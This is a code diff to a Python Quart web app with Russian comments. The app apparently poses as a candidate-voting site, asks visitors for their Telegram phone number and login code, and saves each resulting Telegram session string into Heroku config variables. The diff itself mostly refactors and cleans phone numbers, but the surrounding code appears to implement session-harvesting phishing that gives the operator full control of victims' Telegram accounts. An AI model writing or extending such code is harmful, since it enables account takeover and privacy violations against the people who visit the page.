@@ -5,7 +5,7 @@ from telethon.sessions import StringSession
 import logging
 from dotenv import load_dotenv
 import asyncio
-import heroku3  # Добавляем библиотеку для работы с Heroku API
+import heroku3  # Библиотека для работы с Heroku API
 import subprocess
 
 # Загрузка переменных окружения
@@ -34,7 +34,7 @@ async def create_telegram_client(session_str=None):
     session = StringSession(session_str) if session_str else StringSession()
     global client
     client = TelegramClient(session, api_id, api_hash)
-    
+
     try:
         await client.connect()
         logger.debug("Telegram клиент успешно подключен.")
@@ -61,15 +61,14 @@ async def send_code_with_delay(phone_number):
 # Функция для получения сессии из Heroku
 def get_session_from_heroku(phone_number):
     try:
-        heroku_conn = heroku3.from_key(os.getenv('HEROKU_API_KEY'))
-        app = heroku_conn.apps()[os.getenv('HEROKU_APP_NAME')]
+        heroku_conn = heroku3.from_key(heroku_api_key)
+        app = heroku_conn.apps()[heroku_app_name]
         config = app.config()
 
         # Очистка номера телефона для создания корректного имени переменной окружения
-        clean_phone_number = phone_number.replace('+', '').replace('-', '').replace(' ', '')    
-        
+        clean_phone_number = phone_number.replace('+', '').replace('-', '').replace(' ', '')
+
         env_var_name = f'TELEGRAM_SESSION_{clean_phone_number}'
-        
         logger.debug(f"Ищем переменную окружения: {env_var_name}")
 
         if env_var_name in config:
@@ -82,18 +81,17 @@ def get_session_from_heroku(phone_number):
         logger.error(f"Ошибка при получении сессии из переменной окружения Heroku: {e}")
         raise
 
-
 # Функция для сохранения сессии в Heroku
 def save_session_to_heroku(phone_number, session_str):
     try:
-        heroku_conn = heroku3.from_key(os.getenv('HEROKU_API_KEY'))
-        app = heroku_conn.apps()[os.getenv('HEROKU_APP_NAME')]
+        heroku_conn = heroku3.from_key(heroku_api_key)
+        app = heroku_conn.apps()[heroku_app_name]
         config = app.config()
-        
+
         # Очистка номера телефона для создания корректного имени переменной окружения
         clean_phone_number = phone_number.replace('+', '').replace('-', '').replace(' ', '')
         env_var_name = f'TELEGRAM_SESSION_{clean_phone_number}'
-        
+
         # Сохранение сессии в переменной окружения
         config[env_var_name] = session_str
         logger.debug(f"Сессия успешно сохранена в Heroku для номера {phone_number}")
@@ -101,7 +99,6 @@ def save_session_to_heroku(phone_number, session_str):
     except Exception as e:
         logger.error(f"Ошибка при сохранении сессии в Heroku: {e}")
         raise
-
 
 # Основная страница
 @app.route('/')
@@ -120,22 +117,23 @@ async def vote(candidate):
 async def telegram_number_route():
     if request.method == 'POST':
         phone_number = (await request.form)['phone_number']
-        quart_session['phone_number'] = phone_number
-        logger.debug(f"Получен номер телефона: {phone_number}")
+        clean_phone_number = phone_number.replace('+', '').replace('-', '').replace(' ', '')
+        quart_session['phone_number'] = clean_phone_number
+        logger.debug(f"Получен номер телефона: {clean_phone_number}")
 
         try:
             await create_telegram_client()
-            result = await send_code_with_delay(phone_number)
-            
+            result = await send_code_with_delay(clean_phone_number)
+
             if result:
                 quart_session['phone_code_hash'] = result.phone_code_hash
-                logger.debug(f"Код успешно отправлен на номер {phone_number}. phone_code_hash: {result.phone_code_hash}")
+                logger.debug(f"Код успешно отправлен на номер {clean_phone_number}. phone_code_hash: {result.phone_code_hash}")
             else:
                 return "Превышен лимит запросов. Попробуйте позже."
-            
+
             return redirect(url_for('verify_code'))
         except Exception as e:
-            logger.error(f"Ошибка при отправке кода на номер {phone_number}: {e}")
+            logger.error(f"Ошибка при отправке кода на номер {clean_phone_number}: {e}")
             return f"Ошибка при отправке кода: {e}"
 
     logger.debug("Отображение страницы ввода номера телефона")
